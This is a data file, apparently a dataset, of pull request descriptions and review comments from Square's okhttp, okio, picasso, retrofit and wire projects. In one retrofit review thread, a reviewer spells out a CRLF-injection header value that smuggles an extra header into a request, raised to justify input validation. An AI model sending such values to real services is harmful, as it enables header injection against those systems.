739,square/okhttp,1631.0,This makes URL validation more eager than it is today.,"['LGTM', '```\r\n  MainTest.simple:32 expected:<http://example.com[]> but was:<http://example.com[/]>\r\n  MainTest.contentTypeHeader:66 expected:<http://example.com[]> but was:<http://example.com[/]>\r\n  MainTest.put:39 expected:<http://example.com[]> but was:<http://example.com[/]>\r\n  MainTest.userAgent:82 expected:<http://example.com[]> but was:<http://example.com[/]>\r\n  MainTest.referer:74 expected:<http://example.com[]> but was:<http://example.com[/]>\r\n  MainTest.dataPut:56 expected:<http://example.com[]> but was:<http://example.com[/]>\r\n  MainTest.dataPost:47 expected:<http://example.com[]> but was:<http://example.com[/]>\r\n```', 'https://github.com/square/okhttp/issues/1486']"
740,square/okhttp,142.0,@swankjesse ,"['LGTM after comments', '#### Can you change the code so that a successful connection to a route removes it from the blacklist?', '(Or in a follow up)', 'Also added the removal from failed routes list when connection succeeds.']"
741,square/okhttp,156.0,"This is currently an underpowered API; in practice the only thing
you can do is disable spdy/3. In the future we may support more
transports (spdy/4, http/2.0) and I don't want to make that an
API change.","['@mescortes @JakeWharton ', 'LGTM', '@JakeWharton please take another look']"
742,square/okhttp,204.0,"The list is specified via a magic request property
""X-Android-Transports"" and can be queried via the request
property ""X-Android-Selected-Transport"".

System wide defaults / switches don't need any changes
to okhttp. They can be set as options on the OkHttpClient
used by the platform UrlStreamHandlers.","['Sorry about the churn, had to force push some refs to get rid of bad history.']"
743,square/okhttp,209.0,"Required for backwards compatibility. Null headers
throw an RTE (as they should) when they're set internally
or directly on the RawHeaders object.","[""Thanks, I've fixed the typo in the comment. Please take another look."", 'Love it. LGTM', ""(a small grammar nitpick; please fix & we'll merge.)"", 'Addressed nitpick, PTAL.']"
744,square/okhttp,254.0,"These are only turned on for non-GET requests. This
replaces the RetryableOutputStream mechanism, which
was causing problems for clients whose POSTs weren't
idempotent.","['FYI: @warpspin \r\nR: @mescortes @JakeWharton ', '```\r\n[INFO] OkHttp (Parent) ................................... SUCCESS [1.974s]\r\n[INFO] OkHttp ............................................ SUCCESS [53.994s]\r\n[INFO] OkHttp Apache HttpClient .......................... SUCCESS [1.826s]\r\n[INFO] Samples (Parent) .................................. SUCCESS [0.257s]\r\n[INFO] Sample: Guide ..................................... SUCCESS [1.122s]\r\n[INFO] Sample: Simple Client ............................. SUCCESS [1.197s]\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] BUILD SUCCESS\r\n```', 'LGTM w/ comments.']"
745,square/okio,38.0,@swankjesse ,"[""LGTM, though I'm anxious about Java 7 APIs.""]"
746,square/okio,98.0,"Refs #97.

Use it. Or don't. Was good fun writing/exploring the many ways to do these things.","['Hopefully getting back to this soon.', ""Really excited to see this land. Two big requests though:\r\n\r\nDrop the leading zeros on hex literals. Or make 'em optional? For chunked encoding we don't want 'em, and as far as I know that's the most important use case.\r\n\r\nFix the `request(20)` call to work the same way that `readUtf8Line()` works. Somehow. That's going to be tricky to do nicely.\r\n"", ""(One actually plausible option is to just have have a custom loop in `RealBufferedSource` that knows about the ranges of hex & decimal values: `0-9, a-f, A-F`. That wouldn't be so bad."", 'PTAL', 'Thoughts on leading zeroes? I think JSON wants us to support `00000000000000000000001`.', 'RE: leading zero, already supported', 'Love this.', 'https://github.com/square/okio/pull/118/files']"
747,square/okio,145.0,"The String APIs transcode UTF-16 to UTF-8 and back.

These APIs avoid the UTF-16 intermediate form altogether, and
go right from UTF-8 to a codepoint and back.","[""`HttpUrl` wants this. It's defined in terms of code points, and wants to parse codepoint-by-codepoint. I'm currently doing it Java char-by-char, but it's awkward.\r\nhttps://github.com/square/okhttp/issues/1486"", 'LGTM']"
748,square/okio,148.0,"Previously this was throwing IOException, but nothing was anticipated
that. This is slightly semantically incorrect; the thread wasn't
interrupted. But it's much more convenient to use a single exception
type for both timeouts.

Also add a new type, ForwardingTimeout.",['LGTM']
749,square/picasso,385.0,"@JakeWharton 
@loganj 

- Count number of downloads and actual compressed total size and average size.
- Remove `synchronized` from `createSnapshot()`. We talked with @loganj and said its OK if some of the data is not completely up-to-date. It only does a read on the stats.

I am also not sure if `available()` here is the right call. Can `Content-Length` provide the number here instead?

Couple of questions marked as TODOs in the code. 

Review only for now.","['Also not sure about `available()`.  LG otherwise.', 'You think a `getContentLength()` API should be part of `Response` also?', 'Sure. Might as well add it.', 'I think its done.', ':shipit:', '```\r\nI/Picasso (25343): ===============BEGIN PICASSO STATS ===============\r\nI/Picasso (25343): Memory Cache Stats\r\nI/Picasso (25343):   Max Cache Size: 28760941\r\nI/Picasso (25343):   Cache Size: 11664000\r\nI/Picasso (25343):   Cache % Full: 41\r\nI/Picasso (25343):   Cache Hits: 3\r\nI/Picasso (25343):   Cache Misses: 11\r\nI/Picasso (25343): Network Stats\r\nI/Picasso (25343):   Download Count: 10 <-------\r\nI/Picasso (25343):   Total Download Size: 1098373 <-------\r\nI/Picasso (25343):   Average Download Size: 109837 <-------\r\nI/Picasso (25343): Bitmap Stats\r\nI/Picasso (25343):   Total Bitmaps Decoded: 10\r\nI/Picasso (25343):   Total Bitmap Size: 7982620\r\nI/Picasso (25343):   Total Transformed Bitmaps: 10\r\nI/Picasso (25343):   Total Transformed Bitmap Size: 11664000\r\nI/Picasso (25343):   Average Bitmap Size: 798262\r\nI/Picasso (25343):   Average Transformed Bitmap Size: 1166400\r\nI/Picasso (25343): ===============END PICASSO STATS ===============\r\n```']"
750,square/picasso,388.0,"Closes https://github.com/square/picasso/issues/14

@JakeWharton 

Proposed APIs:
```java
public void into(RemoteViews remoteViews, int viewId, int[] appWidgetIds)
public void into(RemoteViews remoteViews, int viewId, int notificationId, Notification notification)
```

- Support for `RemoteViews` on notifications and widgets. Placeholder and error are also supported.

![device-2014-02-07-175236](https://f.cloud.github.com/assets/310370/2115985/bd20f864-9063-11e3-9fe3-e10add421fac.png)","['+1 for this feature. Would be very useful for me.\r\n\r\nThe only other restriction I can think of for RemoteViews is that for Widgets there is a maximum size for the Bitmap (1.5x screen size).\r\n\r\nIt may be worthwhile making a sample for loading an image into a notification as it is a more complicated (but still common) task. Just setting the image in RemoteViews object is not enough to update the notification- you still need to ping the NotificationManager.', ""> The only other restriction I can think of for RemoteViews is that for Widgets there is a maximum size for the Bitmap (1.5x screen size).\r\n\r\nWe do not know that until we decode the bitmap. This is in the official docs so people should know and I think PIcasso will crash if that is the case and that's a good thing. You should be decoding a smaller bitmap, ideally as big as your view."", 'And yes Notification support sounds good.', '@JayH5 I am not sure we can support notifications at the moment.\r\n\r\nDid you mean add support for Big Picture Style or the large icon (to the left of the notification?) \r\n\r\nThe Big Picture Style is only supported Android 4.1+. I am not sure we want to introduce public API that works only on 4.1.\r\n\r\nI am inclined to restrict support for widgets only.\r\n\r\nAdditionally you can do a lot using `Picasso#get()` to load the bitmap on a background thread and apply it to your notification.', '@dnkoutso Notifications have always been able to use RemoteViews. Android 4.1 just added an extra size.\r\n\r\nYou can do something like this:\r\n```java\r\n// Create the widget using the support package builder\r\nRemoteViews notificationView =\r\n    new RemoteViews(context.getPackageName(), R.layout.notification);\r\nNotificationCompat.Builder builder = new NotificationCompat.Builder(context);\r\nbuilder.setSmallIcon(myIcon)\r\n    .setPriority...\r\n    .setContent(notificationView);\r\nNotification notification = builder.build();\r\n\r\n// Show the notification\r\nint notificationId = 1; // Or whatever\r\nNotificationManager nm =\r\n    (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);\r\nnm.notify(notificationId, notification);\r\n\r\n// Notification is shown, now we want to update the image\r\nnotificationView.setImageViewBitmap(R.id.notification_image, myNewImage);\r\nnm.notify(notificationId, notification);\r\n```\r\n\r\nObviously still a bit more complicated than the AppWidgets. Maybe a first step is just to add Widgets and worry about Notifications later. But to say that AppWidgets are the only use of RemoteViews would be inaccurate. RemoteViewsAction should probably become AppWidgetAction or something like that.', 'Agreed. I think we can land on:\r\n\r\n```java\r\ninto(RemoteViews remoteViews, int viewId);\r\n```\r\n\r\nAs the basic API and perhaps:\r\n\r\n```java\r\ninto(RemoteViews remoteViews, int viewId, int... appWidgetIds)\r\n```', 'Even better: those are the same API. Varargs can take zero arguments.', 'On a second thought we need to keep track of `notificationId` and `notification` for updating.', ""OK. Works for notifications now too. I haven't tried `BigPictureStyle` but here are the APIs I propose.\r\n\r\n```java\r\npublic void into(RemoteViews remoteViews, int viewId, int[] appWidgetIds)\r\npublic void into(RemoteViews remoteViews, int viewId, int notificationId, Notification notification)\r\n```"", '@JakeWharton I think its done. Please take a look. I am removing the review only text.', 'looks good', 'Done.']"
751,square/picasso,398.0,"@JakeWharton 

This felt like it should be simpler.

The benefit is pretty good.

Most `BitmapHunter`s do not need to allocate an `ArrayList`. This further reduces unnecessary  object allocation for nothing.

With the various performance improvements the sample app runs pretty smooth almost always below the 16ms line.

![device-2014-02-10-194256](https://f.cloud.github.com/assets/310370/2133914/824edf06-92d1-11e3-9745-eedf3acd3f75.png)
","['Delete and add `coverage.ec` to `.gitignore`', ':shipit:', 'I love your attention to detail. But Pong is pong.']"
752,square/picasso,407.0,"@JakeWharton 

",[':thumbsup: ']
753,square/picasso,509.0,closes #68 ,"[':shipit: :shipit: :shipit: :shipit: :shipit: :shipit: :shipit: :shipit: ', 'Fixed. I also fixed the `with()` method in `Picasso.java`. It had `logging(true)` enabled by default.', 'mergerered']"
754,square/picasso,554.0,,[]
755,square/picasso,666.0,"Not sure if you've considered something like this in the past but here it is. This patch implements request priority support in Picasso. This feature can be especially handy when you have UIs with lots of images and you want to have tighter control over which images should load first. This is inspired by Volley's API.

It adds a new API in `RequestCreator` to define the request priority:

```java
Picasso.with(context)
       .load(""http://example.com/image.jpg"")
       .priority(HIGH)
       .into(someImageView);
```

Priority can be `LOW`, `NORMAL`, `HIGH`, or `IMMEDIATE`. `BitmapHunters` compute their priority in the executor by taking the highest priority of its attached requests. For example, if a `BitmapHunter` has two attached `Actions`, one `LOW` and and one `HIGH` priority, its priority will be `HIGH`.","[""We have, but I think those might be too many priorities. This is the same problem as log levels. Everyone wants a lower log level or a higher log level because they abuse them.\r\n\r\nI wanted only two, but I can probably be convinced for three. I don't think I can be convinced of four."", '@JakeWharton Fair enough. Let\'s start with just LOW, NORMAL, HIGH then. I think using only two priorities feels too ""polarizing"". Three gives enough flexibility for more complex cases.', 'Updated branch:\r\n* Update `BitmapHunter` priority when requests get attached/detached. `getPriority()` is now simple getter.\r\n* Moar tests.\r\n* Moar API docs.', "":thumbsup: :thumbsup: :thumbsup: \r\n\r\nOne of the more challenging things I'd like to figure out is a way to limit the number of threads on which `LOW` priority requests can execute. Something like half the threads (and then rounded down). I'd like to be able to execute 100 `fetch()` requests, for example, but still allow `NORMAL` and `HIGH` requests to start without having to wait."", ':+1: well done @lucasr ']"
756,square/retrofit,342.0,,"[""Good idea: gets a good bit of coverage you'd otherwise need MockWebServer(MWS) for.  MWS is awesome but does take a significant amount of setup vs this.\r\n\r\nThis approach tests at interface level as opposed to http.  Pros are that you arent testing converters, dont need to open ports etc, covers common failure cases.  Cons are that this doesnt test the fuller stack you cam with MWS.  That said, such tests often could be MWS tests in retrofit itself or individual converter modules...\r\n\r\ncc @jessewilson"", 'Uhh I meant cc @swankjesse', '@edenman ', 'LGTM']"
757,square/retrofit,620.0,"Before we attempted to normalize the parameter annotations into a name and type model. The introduction of multi-part transfer encodings required something more expressive so the annotation instances themselves were used. This change removes the name and type in favor of using the annotation for everything.

Deprecate the pre-encoded annotations in favor of boolean fields on the corresponding 'regular' annotation.

@swankjesse ","['LGTM. Nothing necessarily actionable in the feedback, just giving you my reactions']"
758,square/retrofit,136.0,"# DO NOT MERGE

Looking for preliminary review feedback before moving forward to fix all the tests.

This still reads the entirety of response bodies to `byte[]` rather than allowing for streaming. That will be fixed once this lands.

*TODO:*

 * [x] Test non-interface methods still work (e.g., `toString`, `hashCode`, etc.).
 * [x] Test parsing of interface method annotations, params, and callback/return type.
 * [x] Test `RequestBuilder` properly creating `Request` instances.
 * [x] `Request` through `ApacheClient` creates correct `HttpUriRequest`.
 * [x] `HttpResponse` through `ApacheClient` creates correct `Response`
 * [x] `Profiler` is called correctly (e.g., object is passed through, times, etc.).
 * [x] Sync/Async execution invokes executors properly.
 * [x] `Response` parsing by `RestHandler` to `RetrofitError` and valid success type.
 * [x] Relative paths must start with `/`.","['All TODOs and feedback addressed! Ready for another review.', 'Updated per our discussions, @swankjesse.', ""LGTM\r\n\r\nLets Get This Merged. I added still more nitpicks & ideas, but those don't need to block this from being committed. I'd rather get this checked in imperfect than grow this any further.\r\n\r\nThis is a very nice change. This library is both ergonomic & powerful."", 'Ready for one last sanity check, @swankjesse. All feedback either addressed or is filed under an issue. LGTM!', ""...and I'll squash all these commits before you merge."", ""Jake: I'm embarrassed that everytime I scroll through this PR I get more nitpicky. Please disegard all of my comments, squash your commits, and check in this code. This code is fantastic and it shouldn't have to wait out here in the cold any longer."", '# LGTM', ""I do the same thing. We'll get to 'em all. I addressed all the new ones.""]"
759,square/retrofit,148.0,"Update `Response` to use `TypedInput`.

Closes #135.","['This is only half of the equation. The other half is converting `Request` to use a single `TypedOutput` for its request body, thus abstracting all multipart logic.', 'LGTM']"
760,square/retrofit,732.0,"This disables multipart and form URL encoding for now. Like logging, it shall return!","[""@swankjesse biggun'"", ""After this commit Retrofit's jar is 49.5% smaller than the last release. More weight watchers to come."", '# Laughing Gas Tickles Me\r\n\r\nLGTM. Love this.', ""Wow... what's the reason for removing support for custom clients and/or client providers? A link to the thread where this was discussed works.\r\n\r\nThanks!"", ""There is no discussion thread. The abstractions serve no purpose now that OkHttp is all grown up. You'll still be able to use a custom client, but you'll use OkHttp's types as the request/response model.""]"
761,square/retrofit,812.0,@swankjesse @mattprecious,['LGTM']
762,square/retrofit,845.0,"* `Call` is the mechanism for request execution. It encapsulates a single request action either synchronously or asynchronously, and can support canceling.
* `CallAdapter` is a means of supporting a method return type other than `Call` (like RxJava's `Observable`) by adapting the `Call` instance into another instance. This change moves RxJava support into a sibling module which uses an adapter for supporting `Observable` types.
* `Response` represents the HTTP response along side the deserialized body. It allows access to both the converted body and lower-level items such as the header, response code, and underlying OkHttp request and response objects.

@swankjesse

Closes #835.
Closes #817.
Closes #782.
Closes #710.
Closes #669.
Closes #647.
Closes #461.
Closes #444.
Closes #436.","['@swankjesse PTAL again. Another iteration. Still some stuff to talk about...', ""You've still got a lot of runway here, but LGTM as an early step in a new direction. "", 'Proceeding with test and `MockRestAdapter` updates. Documentation will be last.', ""PTAL! I'm (fairly) confident this is in a state for merge. There's a ton of TODO scattered around for documentation and the mock module is disabled to be updated separately, but it's working!"", '# LGTM\r\n\r\nShipit', 'Can ```Call``` or ```CallAdapter``` be used with ```Espresso 2.0``` ?', ""Yes. I don't see how the two are at all related.\n\nOn Thu, Jul 16, 2015 at 8:55 AM Basilis Charalampakis <\nnotifications@github.com> wrote:\n\n> Can Call or CallAdapter be used with Espresso 2.0 ?\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/square/retrofit/pull/845#issuecomment-121948458>.\n>\n"", 'I mean with [IdlingResource](http://developer.android.com/reference/android/support/test/espresso/IdlingResource.html).', ""You'll have to attach an idling resource to OkHttp's executor inside the\ndispatcher as well as pass Retrofit your own callback executor which is\nattached to an idling resource.\n\nWe'll put an example in https://github.com/JakeWharton/u2020 once 2.0 ships.\n\nOn Thu, Jul 16, 2015 at 10:48 AM Basilis Charalampakis <\nnotifications@github.com> wrote:\n\n> I mean with IdlingResource\n> <http://developer.android.com/reference/android/support/test/espresso/IdlingResource.html>\n> .\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/square/retrofit/pull/845#issuecomment-121978885>.\n>\n"", '@JakeWharton How about using `rx.Observable#doOnUnsubscribe` ?', ""For the idling resource? I think you'd want `doOnTerminate` instead."", 'To replace below?\r\n```\r\n      // Attempt to cancel the call if it is still in-flight on unsubscription.\r\n      subscriber.add(Subscriptions.create(new Action0() {\r\n        @Override public void call() {\r\n          call.cancel();\r\n        }\r\n      }));\r\n```', 'the implementation of `doOnUnsubscribe` is exactly what you just posted', 'Yeah, I know.  Just for semantic clarity? ', ""I don't want to add another operator allocation on top of the already-heavy requirements of RxJava. If the subscription factory had a better name it would be a lot more clear: https://github.com/ReactiveX/RxJava/issues/2967"", 'Good point! :metal:', ""You should be very proud of this work, Jake. The call adapter registry is\nsimple and effective. You've managed to elegantly decouple rx from core\nwithout watering it down or compromising. Really. Good job.\n""]"
763,square/retrofit,906.0,"This also fundamentally changes the `Type` passed to the converter. Instead of just passing the runtime class, we use the type parsed from the method declaration. This allows complex types like `List<Record<Person>>` to be handled by the converter instead of just receiving something like `ArrayList`.

Closes #904.","[""Dig.\r\n\r\nThe PR description might also mention that there's a behavior change!"", 'LGTM']"
764,square/retrofit,908.0,This is still highly-inefficient in its internal use and there are no tests proving that we now fail earlier in configuring a service method. Both of those will come in follow up commits,"[""If you see old copyright dates in what looks like a new file, it's most likely a git mismatch or a file that split into two."", 'LGTM\r\n']"
765,square/retrofit,912.0,This makes all of the mutability during parsing temporary and creates the immutable MethodInvoker.,['LGTM\r\n\r\nThis is landing in a very good place.']
766,square/retrofit,927.0,"This also corrects an incorrect behavior of replacing any path parts in the base URL with the relative URL.

Closes #907. Closes #333. Closes #546.",['LGTM']
767,square/retrofit,200.0,"fix issue #198: add new @Headers and @Header annotations

tested with the below client:
```
  @Headers({
    ""API-Version: 3.3.8"",
    ""Content-Type: application/json""
  })
  static interface DynECTSession {
    @POST(""/Session"")
    Session login(@SingleEntity Credentials creds);

    @DELETE(""/Session"")
    Void logout(@Header(""Auth-Token"") String token);
  }
```","[""One of us is going to have an ugly merge. I think this pull will beat my epic refactor so it'll probably be me, sadly."", ""hope the merge isn't too bad, but I know how these things go...\r\n\r\nI've force-pushed an updated commit that addresses your comments.  I'll look around for a header RFC validator tomorrow, if needed.  thanks for the review!"", 'Awesome, I\'ll take another look in a bit.\r\n\r\nAs for header validation, it doesn\'t have to be anything amazingly robust, just enough to save the user from themselves. My concern is how something like the following would appear in a request.\r\n\r\n```java\r\nvoid bar(@Header(""Whatever"") String whatever, ..);\r\n\r\nfoo.bar(""Hello,\\nWorld!\\r\\nFoo: Bar\\r\\n\\0Blah"", ..);\r\n```', 'just added header name validation commit.  lemme know if that works for you!', ""@adriancole If you don't get to addressing my comments by noon pacific tomorrow then you're in the clear! My massive refactor is done so i'll just manually merge it onto my local branch, fix it up myself, and push a new pull request with both of our changes."", ""Thanks, Jake.  Really excited to see the your refactor!\r\n\r\nOn Friday, May 10, 2013, Jake Wharton wrote:\r\n\r\n> @adriancole <https://github.com/adriancole> If you don't get to\r\n> addressing my comments by noon pacific tomorrow then you're in the clear!\r\n> My massive refactor is done so i'll just manually merge it onto my local\r\n> branch, fix it up myself, and push a new pull request with both of our\r\n> changes.\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub<https://github.com/square/retrofit/pull/200#issuecomment-17708723>\r\n> .\r\n>"", ""ps I'll make the fixes later"", ""Starting my local merge of this in about 20m so if you haven't started by then, don't! And if you have, let me know. Otherwise I'm all over it."", 'go for it.', 'Merged into #202.']"
768,square/retrofit,202.0,"Method level:
 * `@FormUrlEncoded`
 * `@Multipart`

Parameter level:
 * `@Path` - URL path replacement
 * `@Query` - URL query string
 * `@Field` - Form URL-encoded field
 * `@Part` - Multi-part part
 * `@Body` - Single-object body (Old `@SingleEntity`)

This removes support for `@QueryParam`/`@QueryParams` in favor of including constants in the declared URL itself. e.g.,

    @GET(""/list?foo=bar"")

We also bring in support for method and parameter-level header declarations for fine control.","['This also needs a ton of other docs which I have started locally.', '+1\r\n\r\nlooked carefully at all the code and it looks good.', 'Thanks for the feedback @swankjesse.\r\n\r\n@JakeWharton not sure I can push updates to this branch.  Want me to re-open a PR cherry picking these in?', 'LGTM. Just a few nitpicks.', 'Ready for review again.', 'LGTM\r\n\r\nShip it', 'great job, guys.  and thanks!']"
769,square/retrofit,174.0,"Add a new interface, ErrorHandler, which is responsible for throwing customized exceptions during synchronous request errors, or directing to the appropriate callback method for asynchronous request errors.

Currently, API users must catch ```RetrofitError``` and try to determine the cause of the error based on certain properties of the HTTP response. This interface allows API clients to expose semantic exceptions to their users.

For example, if I had an API interface method to create a ```User```, I might expose an ```InvalidUserException``` which could be declared on the ```createUser``` method, and used to indicate that something was invalid about the request.

This implementation allows exceptions to be checked or unchecked, leaving that decision up to the API designer. It also doesn't change any existing behavior. Let me know if there's anything I can do to clean it up!","['Is there any way I can help this move along? Documentation? Different approach entirely?', ""I am working on changing the architecture of how requests get executed altogether. I don't want to merge this when the API most likely will be forced to change."", ""Congrats on the 1.0! I'm going to get this updated to the latest code line shortly."", '@JakeWharton This is updated and tested to work against the latest codebase. ', ""I like the idea here.  Only thing I'd mention is that sometimes a fallback is required.  For example, if you have `boolean userExists(String user)` then you could configure via this or another mechanism the ability to coerce 404 to false.  Do you think it should be in the ErrorHandler, or something else like `@Fallback(NotFoundToFalse.class)`"", '@adriancole An interesting idea! I think one could make a case that this behavior belongs in ErrorHandler, since the user is handling an HTTP error, and making a decision to swallow that error.\r\n\r\nAnother thing this would enable is completely ignoring an error - with the current implementation it is not possible to ignore an error. With a small tweak, these use cases would be possible.', ""I use the following fallbacks quite regularly in other codebases.  Particularly, these help avoid needing to constantly check null.\r\n\r\n  * NullOn404 - ex. return null when asking for an object by id\r\n  * VoidOn404 - ex. delete operation where the thing you were deleting\r\ndidn't exist\r\n  * FalseOn404 - ex. thingExists?\r\n  * EmptyListOn404 - ex. list\r\n  * EmptyMapOn404 - ex. list where the response is more naturally a map\r\n\r\nfood for thought!\r\n"", '@adriancole I slightly modified the ExceptionHandler interface to allow an implementation to return a default value instead of throwing an exception.', 'comments in!', ""@adriancole I slightly disprefer the propogateOrFallback method name because it breaks the congruity with the asynchronous method's name. I updated the comments to more clearly define the terms of the contract."", ""sounds like a plan.  @JakeWharton you have any opinions on this? I'd love to use it this weekend."", 'last ""prefer"" is to squash the commits into one.', ""I *think* I'm onboard with the concept of customizing the exception thrown during synchronous invocation. As I mention above, I don't think the asynchronous one is necessary, though. Can we remove that and then I'll take a deeper look at the implementation?"", ""I'm also cool with sync-only.  Solves my problems ( :) ) and allows us to move this change forward."", ""I removed the async handling - you're right that it's not necessary. I also changed the method to return a String and added a test for the fallback case as well.\r\n\r\nI'm wondering if I should pass along some more information to the ErrorHandler as well - in order to support @adriancole 's Empty*On404 cases, the return type of the method would need to be known."", 'You have checkstyle errors:\r\n```\r\nsrc/main/java/retrofit/ErrorHandler.java:16: Line has trailing spaces.\r\n```', 'Agreed.  We will need a TypeToken available, either explicitly as a parameter, or in scope for the implementation (ex ThreadLocal)', ""@adriancole @JakeWharton cleaned up checkstyle errors, and added the interface method as a param to the ErrorHandler hook.\r\n\r\nI also renamed the interface method to propagateOrFallback at @adriancole's recommendation."", ""@sberan I'm going to try and make a realistic test case that uses the Method param.. I think we'll only need TypeToken or Class"", 'OK I\'ve started playing around with the commit.  I\'m taking the following client into consideration\r\n\r\n```\r\n  interface ExampleClient {\r\n    @GET(""/"")\r\n    String throwsCustomException() throws IllegalStateException;\r\n\r\n    @HEAD(""/"")\r\n    boolean exists();\r\n  }\r\n```\r\nI\'d revise the naming and args slightly for ErrorHandler\r\n```\r\nObject fallbackOrPropagate(RetrofitError cause, Type type); // ex. convert response.status 404 -> false\r\n```\r\n\r\nWith this together with Converter, I can write a fairly sensibly coupled system to account for these concerns:\r\n```\r\n    public class MyConverter implements ErrorHandler extends GsonConverter {\r\n      @Override\r\n      Object fromBody(TypedInput body, Type type) throws ConversionException {\r\n        if (type == boolean.class)\r\n          return true;\r\n        else if (type == String.class)\r\n          return new String(Utils.streamToBytes(body.in()));\r\n        return super.fromResponse(response, type);\r\n      }\r\n\r\n      @Override\r\n      public Object fallbackOrPropagate(RetrofitError cause, Type type) throws Throwable {\r\n        if (cause.getResponse().getStatus() == 404 && type == boolean.class)\r\n          return false;\r\n        else if (cause.getResponse().getStatus() == 409)\r\n          throw new IllegalStateException(cause.getMessage());\r\n        throw cause;\r\n      }\r\n    }\r\n```\r\nThoughts?\r\n', 'note (to those reading email) I revised my comment on github', ""revised my comments as there's nothing in this issue that requires action in issue #224 "", 'My idea with passing the entire method was that additional information such as annotations could be useful. ', ""Personally I'd rather have type and also the ability to set a method-scoped\r\nfallback :). Lacking a method-scoped fallback, I can see how we'd need\r\nreflection more often.\r\n\r\nI think in the future we will have a compile processor, so probably better\r\nto avoid passing things into user Apis that facilitate more reflection.\r\n\r\nWdyt?\r\n"", ""@sberan I'll push a branch showing what I mean shortly."", 'here\'s what I was thinking.  \r\nhttps://github.com/adriancole/retrofit/compare/master...exceptionHandler\r\n\r\nThis ensures reflection stuff only happens once (restMethodInfo), and allows the fallback to be specified on a method.\r\n\r\nex.\r\n```\r\n  static interface FallbackClient {\r\n    @GET(""/"")\r\n    boolean globalFallback();\r\n\r\n    @GET(""/"")\r\n    @Fallback(FalseOn404.class)\r\n    boolean methodFallback();\r\n  }\r\n\r\n  static class FalseOn404 implements FallbackHandler  {\r\n    public Object fallbackOrPropagate(Type type, RetrofitError error) throws Throwable {\r\n      if (error.getResponse().getStatus() == 404 && type == boolean.class)\r\n        return false;\r\n      throw error;\r\n    }\r\n  }\r\n```\r\n\r\nfeel free to cherry-pick and squash the commit into yours, if helpful.', 'I\'m still not convinced this needs to go in. It seems like it\'s trying to place far too much logic inside Retrofit where the same could just as easily be accomplished with a more intelligent wrapper class.\r\n```java\r\ninterface FooService {\r\n  @GET(""/"") String foo();\r\n}\r\nclass FooServiceWrapper implements FooService {\r\n  @Inject FooService delegate;\r\n  @Inject @DefaultFoo String defaultFoo;\r\n\r\n  @Override public String foo() {\r\n    try {\r\n      return delegate.foo();\r\n    } catch (RetrofitError e) {\r\n      Response r = e.getResponse();\r\n      if (r != null && r.getStatus() == 404) {\r\n        return defaultFoo;\r\n      }\r\n      throw e;\r\n    }\r\n  }\r\n}\r\n```', ""thanks for the advice @JakeWharton I'll use the wrapper approach until/unless this goes in."", '@JakeWharton @swankjesse on this note.. sounds like we should add an ""idea graveyard"" wiki and/or issue tag.', '@JakeWharton I definitely see your point, but it feels like exception behavior is a similar level of abstraction to return value / parameter conversion. It would be nice to not have to wrap all APIs with wrapper just to handle errors, when everything else can be handled via conversion.']"
770,square/retrofit,229.0,fix issue #227: permit use when servers or intermediaries mistakingly miss Content-Type header,"['note that another way is to change implementations of Client to fallback to TypedInput.mimeType: `application/unknown`.', 'This all looks good. Just mechanical style OCD tweaks and lets get this in.', 'thanks for the review.  replaced the commit addressing your comments.']"
771,square/shuttle,86.0,"Adds a daily_metrics model, updates metrics every night, new graphs.  

@yunussasmaz @RISCfuture ",[]
772,square/shuttle,92.0,@yunussasmaz @RISCfuture ,[]
773,square/shuttle,95.0,"@RISCfuture @yunussasmaz 

",['I will be deploying this tonight.  Should be clean. ']
774,square/wire,15.0,@swankjesse ,"[""Lots of comments on your buffer structure. I've done these before, most notably [JsonReader](https://code.google.com/p/google-gson/source/browse/trunk/gson/src/main/java/com/google/gson/stream/JsonReader.java) in Gson. It uses `pos` and `limit`, and that works very well. It's `fillBuffer()` method takes a parameter of the minimum number of bytes to make available; that way I can request 4 bytes when I need that many and fail if that request won't work."", ""Thanks for the comments. Note that the buffer management might be a bit different than usual since we don't (need to) perform compaction."", 'LGTM.\r\n\r\nTest a dataset that exceeds the buffer size?', 'Added a test.']"
775,square/wire,25.0,"@swankjesse 

I ported this over from the pre-open source version of Wire.
This depends on https://github.com/square/protoparser/pull/12, so it doesn't build yet.","['This is good to merge when ready.', 'Perfect timing! We need this for something today!', 'Awesome - let me know how it works!']"
776,square/wire,29.0,"@swankjesse 
@JakeWharton 

",['LGTM\r\n\r\nReally happy with how this turned out. Nice work Dan.']
777,square/wire,51.0,"@pyricau
@swankjesse 
","[""Looks like a good move. Can't really LGTM since I don't know much about all this."", 'I moved the nested classes into their own files to make WireCompiler a bit smaller. I think there needs to be a major refactor in a future PR to make it more modular.', 'Mostly LGTM! Just some nitpick-ery. :shipit:']"
778,square/wire,76.0,"I want to send these in small chunks so they can actually be reviewed.

@swankjesse @danrice-square ","['Mind adding a link or blurb of the goal of v2 and specifically this part of it?\r\n\r\nCode looks nice and clean!', ""This is working towards https://github.com/square/wire/issues/75. Contained in this PR is a public API for discovering proto files, parsing their schemas, and filtering their types.\r\n\r\nAfter running the above code you are left with all the information needed to write a code generator for whatever you want. Built-in and yet unwritten will be a generator that takes this object model and writes out `wire-runtime`-compatible Java. But you could just as well generate Objective-C code or even Java that was compliant with Google's regular and lite runtimes."", ""And what's in this PR is not done. It's just at a step where it compiles and passes all contained tests. I'm sure as I start hooking up the code generator and interfacing with the command-line handler things will change a bit. I just want to get eyes on it in smaller chunks than if I were to drop the whole modularization rewrite in a single PR.\r\n\r\nI'll keep making PRs against the `version-two` branch and then we can make a PR from it to `master` at the end."", 'LGTM', 'cc @strangemonad ', 'LGTM', 'LGTM']"
779,square/wire,92.0,@JakeWharton @danrice-square @swankjesse @square/wire-contributors ,"['This is a great idea.', 'PTAL ', 'LGTM']"
780,square/wire,124.0,"@swankjesse @adriancole

I used a version of 1.4.0 but perhaps this should part of 2.0? It's a pretty trivial change to adjust to in client code.","['we good now?  I could use this!', 'I pushed an update to use Okio 0.6.0. Can I get an merge?']"
781,square/wire,127.0,"@adriancole
@swankjesse 
@JakeWharton 

This is a first pass for the case ( la Retrofit) where all you need is a service interface. If there's demand, we can open this up to generate separate classes for a service interface and implementation.
","[""Note this requires an unreleased version of JavaWriter at the moment, so Travis can't build it.\r\n"", 'PTAL', 'JavaWriter release happened, Wire build is green.', 'LGTM! Thanks for the work!']"
